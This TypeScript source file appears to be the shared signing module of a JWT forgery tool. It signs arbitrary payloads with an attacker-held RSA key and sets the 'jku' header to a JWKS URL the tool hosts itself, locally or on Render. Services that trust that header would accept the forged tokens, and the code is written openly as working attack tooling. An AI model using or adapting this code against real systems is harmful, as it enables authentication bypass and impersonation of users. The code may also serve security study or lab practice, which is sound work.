import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';

// Shared signing logic used by both the CLI (forge-token.ts) and the local
// forge UI (routes/api.ts). Never exposed to the network directly - only the
// resulting token crosses an HTTP boundary, the private key never does.

const KEYS_DIR = path.join(__dirname, '..', 'keys');
export const KID = 'attacker-key-1';

function toBase64(str: string): string {
  return Buffer.from(str).toString('base64url');
}

function sign(data: string, privateKeyPem: string): string {
  const signer = crypto.createSign('RSA-SHA256');
  signer.update(data);
  signer.end();
  return signer.sign(privateKeyPem).toString('base64url');
}

export function loadPrivateKey(): string {
  const privateKeyPath = path.join(KEYS_DIR, 'private-key.pem');
  if (!fs.existsSync(privateKeyPath)) {
    throw new Error('No private key found. Run `npm run generate-keys` first.');
  }
  return fs.readFileSync(privateKeyPath, 'utf-8');
}

export interface ForgedToken {
  token: string;
  header: { alg: string; typ: string; kid: string; jku: string };
}

export function forgeToken(payload: unknown, jku: string): ForgedToken {
  const privateKey = loadPrivateKey();
  const header = { alg: 'RS256', typ: 'JWT', kid: KID, jku };

  const headerEnc = toBase64(JSON.stringify(header));
  const payloadEnc = toBase64(JSON.stringify(payload));
  const signature = sign(`${headerEnc}.${payloadEnc}`, privateKey);

  return { token: `${headerEnc}.${payloadEnc}.${signature}`, header };
}

// Same default used everywhere this host advertises its own JWKS URL: local
// by default, but auto-detects Render's own public URL when deployed there
// (RENDER_EXTERNAL_URL is set automatically on every Render Web Service), and
// JKU_BASE_URL always wins if set explicitly, for any other host.
export function getJkuUrl(): string {
  const port = process.env.PORT || 3006;
  const base = process.env.JKU_BASE_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${port}`;
  return `${base}/.well-known/jwks.json`;
}
